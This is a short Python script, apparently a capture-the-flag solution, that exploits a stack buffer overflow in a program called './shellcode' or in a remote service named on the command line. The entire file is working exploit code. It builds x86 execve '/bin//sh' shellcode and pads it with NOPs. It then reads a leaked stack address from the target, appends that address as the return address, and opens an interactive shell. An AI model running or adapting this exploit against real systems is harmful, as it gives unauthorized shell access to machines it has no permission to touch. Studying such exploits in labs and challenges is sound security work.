from __future__ import print_function
import struct
import sys
from pwn import *

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"

buff = shellcode + "\x90" * (44 - len(shellcode))

if len(sys.argv) > 1:
    io = remote(sys.argv[1], sys.argv[2])
else:
    io = process('./shellcode')

line = io.recvline()

ret_addr = line[line.find('0x'):line.find('.')]
ret_addr = struct.pack('<I', int(ret_addr, 16))
buff += ret_addr 

io.sendline(buff)

io.interactive()
